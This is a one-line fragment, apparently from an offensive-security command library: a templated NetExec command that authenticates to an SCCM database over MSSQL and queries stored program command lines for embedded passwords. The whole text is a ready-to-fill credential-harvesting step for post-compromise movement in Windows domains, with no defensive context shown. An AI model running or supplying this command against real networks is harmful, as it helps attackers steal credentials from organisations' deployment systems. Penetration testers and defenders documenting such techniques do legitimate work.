        cmd: "nxc mssql {SCCM_DB_SERVER} -u '{USERNAME}' -p '{PASSWORD}' -d {DOMAIN} -q \"SELECT ProgramName,CommandLine,WorkingDirectory FROM v_Program WHERE CommandLine LIKE '%password%' OR CommandLine LIKE '%pwd%'\""
